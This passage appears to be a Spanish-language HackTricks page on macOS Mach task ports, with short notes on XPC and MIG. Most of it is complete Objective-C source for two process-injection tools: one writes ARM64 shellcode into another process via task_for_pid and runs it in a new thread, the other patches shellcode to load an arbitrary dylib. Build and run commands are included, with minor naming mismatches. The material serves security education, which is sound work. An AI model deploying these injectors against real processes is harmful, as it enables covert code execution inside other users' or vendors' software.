  - **Root puede acceder a los puertos de tarea** de aplicaciones **no** compiladas con un tiempo de ejecución **fortificado** (y no de Apple).

**El puerto de nombre de tarea:** Una versión no privilegiada del _puerto de tarea_. Hace referencia a la tarea, pero no permite controlarla. Lo único que parece estar disponible a través de él es `task_info()`.

### Inyección de Shellcode en hilo a través del puerto de tarea

Puedes obtener un shellcode desde:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 

### entitlements.plist

El archivo `entitlements.plist` contiene información sobre los permisos y capacidades que una aplicación tiene en macOS. Estos permisos pueden ser abusados para realizar escaladas de privilegios y llevar a cabo ataques de intercomunicación entre procesos (IPC). 

Para protegerse contra este tipo de abusos, es importante revisar y limitar cuidadosamente los permisos otorgados a las aplicaciones en el archivo `entitlements.plist`.
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Compila** el programa anterior y agrega los **permisos** necesarios para poder inyectar código con el mismo usuario (de lo contrario, necesitarás usar **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</detalles>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
Para que esto funcione en iOS, necesitas el entitlement `dynamic-codesigning` para poder hacer que una memoria escribible sea ejecutable.
{% endhint %}

### Inyección de Dylib en hilo a través del puerto de tarea

En macOS, los **hilos** pueden ser manipulados a través de **Mach** o utilizando la **API posix `pthread`**. El hilo que generamos en la inyección anterior fue generado utilizando la API de Mach, por lo que **no es compatible con posix**.

Fue posible **inyectar un shellcode simple** para ejecutar un comando porque **no era necesario trabajar con APIs compatibles con posix**, solo con Mach. Las **inyecciones más complejas** necesitarían que el **hilo** también sea **compatible con posix**.

Por lo tanto, para **mejorar el hilo**, se debe llamar a **`pthread_create_from_mach_thread`** que creará un pthread válido. Luego, este nuevo pthread podría **llamar a dlopen** para **cargar una dylib** desde el sistema, por lo que en lugar de escribir nuevo shellcode para realizar diferentes acciones, es posible cargar bibliotecas personalizadas.

Puedes encontrar **ejemplos de dylibs** en (por ejemplo, uno que genere un registro y luego puedas escucharlo):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"No se pueden establecer permisos de memoria para el código del hilo remoto: Error %s\n", mach_error_string(kr));
return (-4);
}

// Establecer los permisos en la memoria de la pila asignada
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"No se pueden establecer permisos de memoria para la pila del hilo remoto: Error %s\n", mach_error_string(kr));
return (-4);
}


// Crear hilo para ejecutar el shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // esta es la pila real
//remoteStack64 -= 8;  // necesitamos alineación de 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Pila remota 64  0x%llx, El código remoto es %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"No se puede crear un hilo remoto: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Uso: %s _pid_ _acción_\n", argv[0]);
fprintf (stderr, "   _acción_: ruta a un dylib en disco\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib no encontrado\n");
}

}
```
</detalles>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Secuestro de hilo a través del puerto de tarea <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

En esta técnica se secuestra un hilo del proceso:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Información básica

XPC, que significa Comunicación entre Procesos XNU (el núcleo utilizado por macOS), es un marco para la **comunicación entre procesos** en macOS e iOS. XPC proporciona un mecanismo para realizar **llamadas de método seguras y asíncronas entre diferentes procesos** en el sistema. Es parte del paradigma de seguridad de Apple, permitiendo la **creación de aplicaciones con privilegios separados** donde cada **componente** se ejecuta con **solo los permisos necesarios** para realizar su trabajo, limitando así el daño potencial de un proceso comprometido.

Para obtener más información sobre cómo funciona esta **comunicación** y cómo **podría ser vulnerable**, consulta:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Generador de Interfaz Mach

MIG fue creado para **simplificar el proceso de creación de código Mach IPC**. Esto se debe a que gran parte del trabajo para programar RPC implica las mismas acciones (empaquetar argumentos, enviar el mensaje, desempaquetar los datos en el servidor...).

MIC básicamente **genera el código necesario** para que el servidor y el cliente se comuniquen con una definición dada (en IDL -Lenguaje de Definición de Interfaz-). Aunque el código generado sea feo, un desarrollador solo necesitará importarlo y su código será mucho más simple que antes.

Para obtener más información, consulta:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Referencias

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volumen I, Modo de Usuario, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
